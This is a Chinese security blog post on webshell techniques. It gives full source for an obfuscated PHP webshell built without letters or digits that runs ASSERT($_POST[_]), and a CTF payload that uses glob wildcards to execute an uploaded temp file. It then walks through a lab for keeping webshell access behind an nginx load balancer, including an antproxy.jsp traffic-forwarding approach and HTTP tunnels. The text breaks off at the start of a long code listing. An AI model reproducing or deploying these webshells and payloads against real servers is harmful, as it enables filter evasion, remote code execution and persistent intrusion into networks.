<p>这就得借助 PHP 的一个小技巧，先看文档： <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2xhbmd1YWdlLm9wZXJhdG9ycy5pbmNyZW1lbnQucGhw">http://php.net/manual/zh/language.operators.increment.php</span></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162055456.png" alt="image-20221222162055456"></p>
<p>也就是说， <code>'a'++ =&gt; 'b'</code> ， <code>'b'++ =&gt; 'c'</code> … 所以，我们只要能拿到一个变量，其值为 <code>a</code> ，通过自增操作即可获得 a-z 中所有字符。</p>
<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
<p>巧了，数组（Array）的第一个字母就是大写 A，而且第 4 个字母是小写 a。也就是说，我们可以同时拿到小写和大写 A，等于我们就可以拿到 a-z 和 A-Z 的所有字母。</p>
<p>在 PHP 中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为 <code>Array</code> ：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162132570.png" alt="image-20221222162132570"></p>
<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
<p>利用这个技巧，我编写了如下 webshell（因为 PHP 函数是大小写不敏感的，所以我们最终执行的是 <code>ASSERT($_POST[_])</code> ，无需获取小写 a）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162209960.png" alt="image-20221222162209960"></p>
<h2 id="无字母数字webshell之命令执行"><a class="markdownIt-Anchor" href="#无字母数字webshell之命令执行">#</a> 无字母数字 webshell 之命令执行</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题的限制：</p>
<ol>
<li>webshell 长度不超过 35 位</li>
<li>除了不包含字母数字，还不能包含 <code>$</code>  和 <code>_</code></li>
</ol>
<p>难点呼之欲出了，我前面文章中给出的所有方法，都用到了 PHP 中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为 <code>$</code>  不能使用了，所以我们无法构造 PHP 中的变量。</p>
<h3 id="php7-下简单解决问题"><a class="markdownIt-Anchor" href="#php7-下简单解决问题">#</a> PHP7 下简单解决问题</h3>
<p>PHP7 前是不允许用 <code>($a)();</code>  这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过 <code>('phpinfo')();</code>  来执行函数，第一个括号中可以是任意 PHP 表达式。</p>
<p>所以很简单了，构造一个可以生成 <code>phpinfo</code>  这个字符串的 PHP 表达式即可。payload 如下（不可见字符用 url 编码表示）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
<h3 id="php5的思考"><a class="markdownIt-Anchor" href="#php5的思考">#</a> PHP5 的思考</h3>
<p>PHP 自然也能够和操作系统进行交互，“反引号” 就是 PHP 中最简单的执行 shell 的方法。那么，在使用 PHP 无法解决问题的情况下，为何不考虑用 “反引号”+“shell” 的方式来 getshell 呢？</p>
<p>因为反引号不属于 “字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、 <code>$</code>  的系统命令来 getshell？</p>
<p>好像问题又回到了原点：无字母、数字、 <code>$</code> ，在 shell 中仍然是一个难题。</p>
<p>此时我想到了两个有趣的 Linux shell 知识点：</p>
<ol>
<li>shell 下可以利用 <code>.</code>  来执行任意脚本</li>
<li>Linux 文件名支持用 glob 通配符代替</li>
</ol>
<p><code>.</code>  或者叫 period，它的作用和 source 一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. file</code>  的意思就是用 bash 执行 file 文件中的命令。</p>
<p>用 <code>. file</code>  执行文件，是不需要 file 有 x 权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用 <code>.</code>  来执行它了吗？</p>
<p>这个文件也很好得到，我们可以发送一个上传文件的 POST 包，此时 PHP 会将我们上传的文件保存在临时文件夹下，默认的文件名是 <code>/tmp/phpXXXXXX</code> ，文件名最后 6 个字符是随机的大小写字母。</p>
<p>第二个难题接踵而至，执行 <code>. /tmp/phpXXXXXX</code> ，也是有字母的。此时就可以用到 Linux 下的 glob 通配符：</p>
<ul>
<li><code>*</code>  可以代替 0 个及以上任意字符</li>
<li><code>?</code>  可以代表 1 个任意字符</li>
</ul>
<p>那么， <code>/tmp/phpXXXXXX</code>  就可以表示为 <code>/*/?????????</code>  或 <code>/???/?????????</code> 。</p>
<p>但我们尝试执行 <code>. /???/?????????</code> ，却得到如下错误：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png" alt="image.png"></p>
<p>这是因为，能够匹配上 <code>/???/?????????</code>  这个通配符的文件有很多，我们可以列出来：</p>
<p><img data-src="https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="image.png"></p>
<p>可见，我们要执行的 <code>/tmp/phpcjggLC</code>  排在倒数第二位。然而，在执行第一个匹配上的文件（即 <code>/bin/run-parts</code> ）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>其中，glob 支持用 <code>[^x]</code>  的方法来构造 “这个位置不是字符 x”。那么，我们用这个姿势干掉 <code>/bin/run-parts</code> ：</p>
<p>[<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></p>
<p>排除了第 4 个字符是 <code>-</code>  的文件，同样我们可以排除包含 <code>.</code>  的文件：</p>
<p>[<img data-src="https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png">]</p>
<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
<p>继续阅读 glob 的帮助，我发现另一个有趣的用法：</p>
<p>[<img data-src="https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png" alt="image.png">]</p>
<p>就跟正则表达式类似，glob 支持利用 <code>[0-9]</code>  来表示一个范围。</p>
<p>我们再来看看之前列出可能干扰我们的文件：</p>
<p>[<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png" alt="image.png"></p>
<p>所有文件名都是小写，只有 PHP 生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示 “大写字母” 的 glob 通配符，就能精准找到我们要执行的文件。</p>
<p>翻开 ascii 码表，可见大写字母位于 <code>@</code> 与 <code>[</code> 之间：</p>
<p>那么，我们可以利用 <code>[@-[]</code>  来表示大写字母：</p>
<p><img data-src="https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png" alt="image.png"></p>
<p>当然，php 生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>最后，我传入的 code 为 <code>?&gt;&lt;?=</code> . /???/???[@-[] <code>;?&gt;</code> ，发送数据包如下：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160238734.png" alt="image-20221222160238734"></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s">无字母数字 webshell 之提高篇 | 离别歌 (leavesongs.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS5odG1s">一些不包含数字和字母的 webshell | 离别歌 (leavesongs.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcGhwLWNhbGxiYWNrLWJhY2tkb29yLmh0bWw=">创造 tips 的秘籍 ——PHP 回调后门 | 离别歌 (leavesongs.com)</span></p>
<h2 id="niginx负载均衡下的webshell"><a class="markdownIt-Anchor" href="#niginx负载均衡下的webshell">#</a> niginx 负载均衡下的 webshell</h2>
<p>根据我的老师说，这是一道奇安信四面的原题，确实很有意思，思路很棒</p>
<p>反向代理方式其中比较流行的方式是用 nginx 来做负载均衡。我们先简单的介绍一下 nginx 支持的几种策略：</p>
<table>
<thead>
<tr>
<th><strong>名称</strong></th>
<th><strong>策略</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>轮询（默认）</strong></td>
<td>按请求顺序逐一分配</td>
</tr>
<tr>
<td>weight</td>
<td>根据权重分配</td>
</tr>
<tr>
<td>ip_hash</td>
<td>根据客户端 IP 分配</td>
</tr>
<tr>
<td>least_conn</td>
<td>根据连接数分配</td>
</tr>
<tr>
<td>fair (第三方)</td>
<td>根据响应时间分配</td>
</tr>
<tr>
<td>url_hash (第三方)</td>
<td>根据 URL 分配</td>
</tr>
</tbody>
</table>
<p>其中 ip_hash、url_hash 这种能固定访问到某个节点的情况，我们也不讨论，跟单机没啥区别么不是。</p>
<p>实验环境:</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz">AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)</span></p>
<p>LBSNode1 和 LBSNode2 均存在位置相同的 Shell: ant.jspNode1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。 我们只能通过 nginx 这台机器访问。nginx 的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                          ┌─────────────┐</span><br><span class="line">                          │             │</span><br><span class="line">                   ┌──────►  LBSNode 1  │</span><br><span class="line">┌─────────┐        │      │             │</span><br><span class="line">│         │        │      └─────────────┘</span><br><span class="line">│  Nginx  ├────────┤</span><br><span class="line">│         │        │      ┌─────────────┐</span><br><span class="line">└─────────┘        │      │             │</span><br><span class="line">                   └──────►  LBSNode 2  │</span><br><span class="line">                          │             │</span><br><span class="line">                          └─────────────┘</span><br></pre></td></tr></table></figure>
<p>Node1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。</p>
<p>我们只能通过 nginx 这台机器访问。nginx 的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@68569d913743:/etc/nginx/conf.d# cat default.conf </span><br><span class="line">upstream lbspool &#123;</span><br><span class="line">  server lbsnode1:8080;</span><br><span class="line">  server lbsnode2:8080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80 default_server;</span><br><span class="line">    server_name  _;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    root   /usr/share/nginx/html;</span><br><span class="line">    index index.jsp index.html index.htm;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://lbspool;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>安装后运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos loadbalance-jsp]# docker-compose  up -d </span><br><span class="line">Building lbsnode1</span><br><span class="line">Sending build context to Docker daemon  3.584kB</span><br><span class="line">Step 1/3 : FROM tomcat:8-jre8</span><br><span class="line">8-jre8: Pulling from library/tomcat</span><br><span class="line">0e29546d541c: Pull complete </span><br><span class="line">9b829c73b52b: Pull complete </span><br><span class="line">cb5b7ae36172: Pull complete </span><br><span class="line">99ce012bef04: Pull complete </span><br><span class="line">22dc2a72d098: Pull complete </span><br><span class="line">9c69a57e10d9: Pull complete </span><br><span class="line">0c402b19a0b5: Pull complete </span><br><span class="line">8763e342e4d6: Pull complete </span><br><span class="line">b0c861fdc153: Pull complete </span><br><span class="line">ed0917d955ad: Pull complete </span><br><span class="line">Digest: sha256:5acd69685158898fda4eb4b854e2170068ced2c925ce9a364d214893e966fad6</span><br><span class="line">Status: Downloaded newer image for tomcat:8-jre8</span><br><span class="line"> ---&gt; cc1cf9719b23</span><br><span class="line">Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp</span><br><span class="line"> ---&gt; 47aa660fe449</span><br><span class="line">Step 3/3 : EXPOSE 8080</span><br><span class="line"> ---&gt; Running in 6c4c3ca597ba</span><br><span class="line">Removing intermediate container 6c4c3ca597ba</span><br><span class="line"> ---&gt; 5024db4a4111</span><br><span class="line">Successfully built 5024db4a4111</span><br><span class="line">Successfully tagged loadbalance-jsp_lbsnode1:latest</span><br><span class="line">WARNING: Image for service lbsnode1 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.</span><br><span class="line">Building lbsnode2</span><br><span class="line">Sending build context to Docker daemon  3.584kB</span><br><span class="line">Step 1/3 : FROM tomcat:8-jre8</span><br><span class="line"> ---&gt; cc1cf9719b23</span><br><span class="line">Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 47aa660fe449</span><br><span class="line">Step 3/3 : EXPOSE 8080</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 5024db4a4111</span><br><span class="line">Successfully built 5024db4a4111</span><br><span class="line">Successfully tagged loadbalance-jsp_lbsnode2:latest</span><br><span class="line">WARNING: Image for service lbsnode2 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.</span><br><span class="line">Pulling nginx (nginx:1.17)...</span><br><span class="line">1.17: Pulling from library/nginx</span><br><span class="line">afb6ec6fdc1c: Pull complete</span><br><span class="line">b90c53a0b692: Pull complete</span><br><span class="line">11fa52a0fdc0: Pull complete</span><br><span class="line">Digest: sha256:6fff55753e3b34e36e24e37039ee9eae1fe38a6420d8ae16ef37c92d1eb26699</span><br><span class="line">Status: Downloaded newer image for nginx:1.17</span><br><span class="line">Creating loadbalance-jsp_lbsnode1_1 ... done</span><br><span class="line">Creating loadbalance-jsp_lbsnode2_1 ... done</span><br><span class="line">Creating loadbalance-jsp_nginx_1    ... done</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos loadbalance-jsp]# docker ps -a </span><br><span class="line">CONTAINER ID   IMAGE                      COMMAND                  CREATED         STATUS                            PORTS                                     NAMES</span><br><span class="line">68569d913743   nginx:1.17                 &quot;nginx -g &#x27;daemon of…&quot;   7 seconds ago   Up 6 seconds                      0.0.0.0:18080-&gt;80/tcp, :::18080-&gt;80/tcp   loadbalance-jsp_nginx_1</span><br><span class="line">f3175d7fbc4d   loadbalance-jsp_lbsnode2   &quot;catalina.sh run&quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode2_1</span><br><span class="line">36b280c80c6c   loadbalance-jsp_lbsnode1   &quot;catalina.sh run&quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode1_1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225150810566.png" alt="image-20221225150810566"></p>
<table>
<thead>
<tr>
<th style="text-align:center">Shell</th>
<th style="text-align:center">密码</th>
<th style="text-align:center">编码器</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>http://127.0.0.1:18080/ant.jsp</code></td>
<td style="text-align:center"><code>ant</code>  ｜  <code>default</code></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>使用蚁剑连接</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151010579.png" alt="image-20221225151010579"></p>
<p>打开虚拟终端</p>
<p>然后连接目标，因为两台节点都在相同的位置存在 ant.jsp，所以连接的时候也没出现什么异常</p>
<p>但是我们会一直在两个节点上轮询</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151054131.png" alt="image-20221225151054131"></p>
<p>因为没有 ifconfig 和 ip a 命令，使用时需要安装 <code>apt install net-tools</code> ，但是由于负载分担导致需要安装两次</p>
<p><strong>难点一</strong>：我们需要在<strong>每一台节点</strong>的<strong>相同位置</strong>都上传<strong>相同内容的 WebShell</strong></p>
<p>一旦有一台机器上没有，那么在请求轮到这台机器上的时候，就会出现 404 错误，影响使用。<strong>是的，这就是你出现一会儿正常，一会儿错误的原因。</strong></p>
<p><strong>难点二</strong>：我们在执行命令时，<strong>无法知道下次的请求交给哪台机器去执行</strong>。</p>
<p>我们执行 ip addr 查看当前执行机器的 ip 时，可以看到一直在飘，因为我们用的是轮询的方式，还算能确定，一旦涉及了权重等其它指标，就让你好好体验一波什么叫飘乎不定。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183659128.png" alt="image-20221225183659128"></p>
<p><strong>难点三：<strong>当我们需要</strong>上传一些工具</strong>时，麻烦来了 **：**</p>
<p>由于 antSword 上传文件时，采用的分片上传方式，把一个文件分成了多次 HTTP 请求发送给了目标，所以尴尬的事情来了，两台节点上，各一半，而且这一半到底是怎么组合的，取决于 LBS 算法</p>
<p><strong>难点四：由于目标机器不能出外网，想进一步深入，只能使用 reGeorg/HTTPAbs 等 HTTP Tunnel，可在这个场景下，这些 tunnel 脚本全部都失灵了。</strong></p>
<p><strong>Plan A</strong>  <strong>关掉其中一台机器</strong> <strong>（作死）</strong></p>
<p>是的，首先想到的第一个方案是关机 / 停服，只保留一台机器，因为健康检查机制的存在，很快其它的节点就会被 nginx 从池子里踢出去，那么妥妥的就能继续了。</p>
<p>影响业务，还会造成灾难，直接 Pass 不考虑。（实验环境下，权限够的时候是可以测试可行性的）。</p>
<p><strong>Plan B</strong>   <strong>执行前先判断要不要执行</strong></p>
<p>我们既然无法预测下一次是哪台机器去执行，那我们的 Shell 在执行 Payload 之前，先判断一下要不要执行不就行了？</p>
<p>以执行命令时 Bash 为例，在执行前判断一下 IP：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183448234.png" alt="image-20221225183448234"></p>
<p><strong>Plan C</strong>   <strong>在 Web 层做一次 HTTP 流量转发</strong> <strong>（重点）</strong></p>
<p>没错，我们用 AntSword 没法直接访问 LBSNode1 内网 IP (172.23.0.2) 的 8080 端口，但是有人能访问呀，除了 nginx 能访问之外，<strong>LBSNode2 这台机器也是可以访问 Node1 这台机器的 8080 端口</strong>的。</p>
<p>还记不记得 「PHP Bypass Disable Function」 这个插件，我们在这个插件加载 so 之后，本地启动了一个 httpserver，然后我们用到了 HTTP 层面的流量转发脚本 「<strong>antproxy.php</strong>」, 我们放在这个场景下看：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225152044677.png" alt="image-20221225152044677"></p>
<p>我们一步一步来看这个图，我们的目的是：<strong>所有的数据包都能发给「LBSNode 1」这台机器。</strong></p>
<p>首先是 第 1 步，我们请求 /antproxy.jsp，这个请求发给 nginx</p>
<p>nginx 接到数据包之后，会有两种情况：</p>
<p>我们先看黑色线，第 2 步把请求传递给了目标机器，请求了 Node1 机器上的 /antproxy.jsp，接着 第 3 步，/antproxy.jsp 把请求重组之后，传给了 Node1 机器上的 /ant.jsp，成功执行。</p>
<p>再来看红色线，第 2 步把请求传给了 Node2 机器，接着第 3 步，Node2 机器上面的 /antproxy.jsp 把请求重组之后，传给了 Node1 的 /ant.jsp，成功执行。</p>
<p><strong>1.</strong> <strong>创建 antproxy.jsp 脚本</strong></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183524538.png" alt="image-20221225183524538"></p>
<p><strong>修改转发地址</strong>，转向<strong>目标 Node</strong> 的 内网 IP 的 <strong>目标脚本</strong> 访问地址。</p>
<p><strong>注意：不仅仅是 WebShell 哟，还可以改成 reGeorg 等脚本的访问地址。</strong></p>
<p>我们将 target 指向了 LBSNode1 的 ant.jsp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 